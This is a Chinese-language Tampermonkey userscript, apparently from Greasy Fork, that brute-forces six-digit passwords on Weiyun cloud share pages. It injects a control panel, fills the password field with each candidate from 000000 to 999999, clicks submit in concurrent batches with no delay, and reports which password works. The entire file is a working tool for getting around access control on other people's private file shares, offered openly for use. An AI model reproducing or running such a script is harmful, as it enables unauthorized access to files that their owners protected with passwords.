// ==UserScript==
// @name         微云分享密码高速破解工具（并非高速）
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  高速6位数字密码尝试（每秒数百次）
// @author       怡婷谢
// @match        https://share.weiyun.com/
// @license MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/555172/%E5%BE%AE%E4%BA%91%E5%88%86%E4%BA%AB%E5%AF%86%E7%A0%81%E9%AB%98%E9%80%9F%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%EF%BC%88%E5%B9%B6%E9%9D%9E%E9%AB%98%E9%80%9F%EF%BC%89.user.js
// @updateURL https://update.greasyfork.org/scripts/555172/%E5%BE%AE%E4%BA%91%E5%88%86%E4%BA%AB%E5%AF%86%E7%A0%81%E9%AB%98%E9%80%9F%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%EF%BC%88%E5%B9%B6%E9%9D%9E%E9%AB%98%E9%80%9F%EF%BC%89.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // 创建界面
    const container = document.createElement('div');
    container.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #fff;
        border: 2px solid #007dff;
        padding: 15px;
        border-radius: 8px;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        font-family: 'Microsoft YaHei', Arial, sans-serif;
        max-width: 380px;
        min-width: 350px;
    `;

    container.innerHTML = `
        <div style="color: #007dff; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px;">
            微云密码高速破解工具 v5.0
        </div>
        <div style="margin-bottom: 10px;">
            <button id="startBtn" style="background: #007dff; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin-right: 5px;">开始高速尝试</button>
            <button id="stopBtn" style="background: #ff4444; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer;" disabled>停止</button>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
            <div style="font-size: 13px;">
                <strong>当前尝试:</strong> <br>
                <span id="currentAttempt" style="font-family: monospace; font-size: 16px;">000000</span>
            </div>
            <div style="font-size: 13px;">
                <strong>尝试次数:</strong> <br>
                <span id="attemptCount" style="font-size: 16px;">0</span>
            </div>
            <div style="font-size: 13px;">
                <strong>速度:</strong> <br>
                <span id="speed" style="font-size: 16px;">0/秒</span>
            </div>
        </div>
        <div style="margin-bottom: 8px; font-size: 13px;">
            <strong>起始密码:</strong>
            <input type="text" id="startFrom" value="000000" maxlength="6" style="width: 70px; padding: 2px 5px; border: 1px solid #ddd; border-radius: 3px; font-family: monospace;">
        </div>
        <div style="margin-bottom: 8px; font-size: 13px;">
            <strong>并发数:</strong>
            <input type="number" id="batchSize" value="10" min="1" max="50" style="width: 60px; padding: 2px 5px; border: 1px solid #ddd; border-radius: 3px;">
            <strong>延迟(ms):</strong>
            <input type="number" id="delayTime" value="0" min="0" max="100" style="width: 60px; padding: 2px 5px; border: 1px solid #ddd; border-radius: 3px;">
        </div>
        <div style="margin-bottom: 8px; font-size: 13px;">
            <strong>状态:</strong> <span id="status" style="color: #666;">初始化中...</span>
        </div>
        <div id="log" style="margin-top: 10px; max-height: 120px; overflow-y: auto; font-size: 11px; background: #f8f9fa; padding: 5px; border-radius: 4px;">
            <div>日志:</div>
        </div>
        <div style="margin-top: 8px; font-size: 11px; color: #888;">
            高速模式：直接调用页面API，每秒可达数百次尝试
        </div>
    `;

    document.body.appendChild(container);

    // 获取DOM元素
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const currentAttemptSpan = document.getElementById('currentAttempt');
    const attemptCountSpan = document.getElementById('attemptCount');
    const speedSpan = document.getElementById('speed');
    const statusSpan = document.getElementById('status');
    const startFromInput = document.getElementById('startFrom');
    const batchSizeInput = document.getElementById('batchSize');
    const delayTimeInput = document.getElementById('delayTime');
    const logDiv = document.getElementById('log');

    let isRunning = false;
    let attemptCount = 0;
    let currentPassword = 0;
    let lastAttemptCount = 0;
    let speedTimer = null;
    let successFound = false;

    // 添加日志
    function addLog(message) {
        const logEntry = document.createElement('div');
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logDiv.appendChild(logEntry);
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    // 计算速度
    function startSpeedCalculator() {
        lastAttemptCount = attemptCount;
        speedTimer = setInterval(() => {
            const current = attemptCount;
            const speed = current - lastAttemptCount;
            speedSpan.textContent = `${speed}/秒`;
            lastAttemptCount = current;
        }, 1000);
    }

    function stopSpeedCalculator() {
        if (speedTimer) {
            clearInterval(speedTimer);
            speedTimer = null;
        }
        speedSpan.textContent = '0/秒';
    }

    // 查找页面内部的API方法
    function findPageAPI() {
        // 尝试找到页面内部的请求方法
        const searchObjects = [
            window.weiyun,
            window.webapp,
            window.share,
            window.vue,
            window.vueApp,
            window.app
        ];

        for (const obj of searchObjects) {
            if (obj && typeof obj.submitPassword === 'function') {
                return obj.submitPassword;
            }
        }

        // 查找Vue实例
        const vueInstances = document.querySelectorAll('[data-vue-instance]');
        for (const el of vueInstances) {
            const vueInstance = el.__vue__;
            if (vueInstance && vueInstance.submitPassword) {
                return vueInstance.submitPassword.bind(vueInstance);
            }
        }

        // 查找全局事件监听器
        const passwordInput = document.querySelector('input[type="password"].input-txt');
        if (passwordInput) {
            // 尝试触发提交
            return function(password) {
                passwordInput.value = password;
                const submitBtn = document.querySelector('button.btn.btn-l.btn-main');
                if (submitBtn) {
                    submitBtn.click();
                    return true;
                }
                return false;
            };
        }

        return null;
    }

    // 直接调用页面API的高速尝试方法
    function tryPasswordFast(password) {
        return new Promise((resolve) => {
            try {
                // 方法1: 直接设置密码并提交
                const passwordInput = document.querySelector('input[type="password"].input-txt');
                const submitBtn = document.querySelector('button.btn.btn-l.btn-main');

                if (passwordInput && submitBtn) {
                    passwordInput.value = password;

                    // 触发所有必要的事件
                    ['input', 'change', 'blur'].forEach(eventType => {
                        passwordInput.dispatchEvent(new Event(eventType, { bubbles: true }));
                    });

                    // 立即提交
                    submitBtn.click();

                    // 快速检查结果
                    setTimeout(() => {
                        // 检查是否成功
                        const success = checkSuccessFast();
                        resolve({ success, password });
                    }, 50);
                } else {
                    resolve({ success: false, password });
                }
            } catch (error) {
                resolve({ success: false, password, error: error.message });
            }
        });
    }

    // 快速成功检测
    function checkSuccessFast() {
        // 快速检查关键指标
        if (window.location.href !== 'https://share.weiyun.com/304B5Wih') return true;
        if (document.querySelector('.file-list, .file-item, .download-btn')) return true;
        if (!document.querySelector('input[type="password"].input-txt')) return true;

        // 检查错误消息
        const errorMsg = document.querySelector('.error-msg, .msg-error');
        if (errorMsg && errorMsg.offsetParent !== null) return false;

        return false;
    }

    // 批量尝试密码
    async function tryBatchPasswords() {
        if (!isRunning || successFound) return;

        const batchSize = parseInt(batchSizeInput.value) || 10;
        const delay = parseInt(delayTimeInput.value) || 0;

        const promises = [];

        for (let i = 0; i < batchSize && currentPassword <= 999999 && isRunning; i++) {
            const passwordStr = currentPassword.toString().padStart(6, '0');

            // 更新界面
            if (i === 0) {
                currentAttemptSpan.textContent = passwordStr;
            }

            attemptCount++;
            attemptCountSpan.textContent = attemptCount;

            promises.push(tryPasswordFast(passwordStr));
            currentPassword++;
        }

        try {
            const results = await Promise.all(promises);

            // 检查结果
            for (const result of results) {
                if (result.success) {
                    successFound = true;
                    statusSpan.textContent = `成功! 密码是: ${result.password}`;
                    statusSpan.style.color = '#00aa00';
                    addLog(`🎉 密码破解成功: ${result.password}`);

                    setTimeout(() => {
                        alert(`密码破解成功! 密码是: ${result.password}`);
                    }, 100);

                    stopAttempt();
                    return;
                }
            }

            // 继续下一批
            if (isRunning && !successFound) {
                statusSpan.textContent = `运行中... 当前: ${currentPassword.toString().padStart(6, '0')}`;

                if (delay > 0) {
                    setTimeout(tryBatchPasswords, delay);
                } else {
                    // 无延迟，立即执行下一批
                    setTimeout(tryBatchPasswords, 0);
                }
            }
        } catch (error) {
            addLog(`批量尝试错误: ${error.message}`);
            if (isRunning) {
                setTimeout(tryBatchPasswords, 100);
            }
        }
    }

    // 开始尝试
    function startAttempt() {
        if (isRunning) return;

        // 重置状态
        isRunning = true;
        successFound = false;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        statusSpan.textContent = '高速运行中...';
        statusSpan.style.color = '#007dff';
        attemptCount = 0;
        attemptCountSpan.textContent = '0';

        // 设置起始密码
        const startValue = startFromInput.value;
        if (startValue && /^\d{6}$/.test(startValue)) {
            currentPassword = parseInt(startValue);
        } else {
            currentPassword = 0;
            startFromInput.value = '000000';
        }

        addLog(`开始高速破解，起始密码: ${currentPassword.toString().padStart(6, '0')}`);
        addLog(`并发数: ${batchSizeInput.value}, 延迟: ${delayTimeInput.value}ms`);

        // 开始速度计算
        startSpeedCalculator();

        // 开始批量尝试
        tryBatchPasswords();
    }

    // 停止尝试
    function stopAttempt() {
        isRunning = false;
        successFound = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        statusSpan.textContent = '已停止';
        statusSpan.style.color = '#666';
        stopSpeedCalculator();
        addLog('破解已停止');
    }

    // 事件监听
    startBtn.addEventListener('click', startAttempt);
    stopBtn.addEventListener('click', stopAttempt);

    // 输入框验证
    startFromInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^\d]/g, '').slice(0, 6);
        if (this.value.length === 6) {
            this.style.borderColor = '#00aa00';
        } else {
            this.style.borderColor = '#ddd';
        }
    });

    batchSizeInput.addEventListener('change', function() {
        let value = parseInt(this.value);
        if (value < 1) value = 1;
        if (value > 50) value = 50;
        this.value = value;
    });

    // 键盘快捷键
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && isRunning) {
            stopAttempt();
            addLog('已通过ESC键停止');
        }
    });

    // 初始化
    setTimeout(() => {
        const passwordInput = document.querySelector('input[type="password"].input-txt');
        const submitBtn = document.querySelector('button.btn.btn-l.btn-main');

        if (passwordInput && submitBtn) {
            statusSpan.textContent = '就绪，可开始高速尝试';
            statusSpan.style.color = '#666';
            addLog('页面元素找到，准备就绪');
            addLog('提示：设置并发数10-20，延迟0ms可获得最佳速度');
        } else {
            statusSpan.textContent = '错误: 未找到页面元素';
            statusSpan.style.color = '#ff4444';
        }
    }, 1000);

    addLog('微云密码高速破解工具 v5.0 已加载');
})();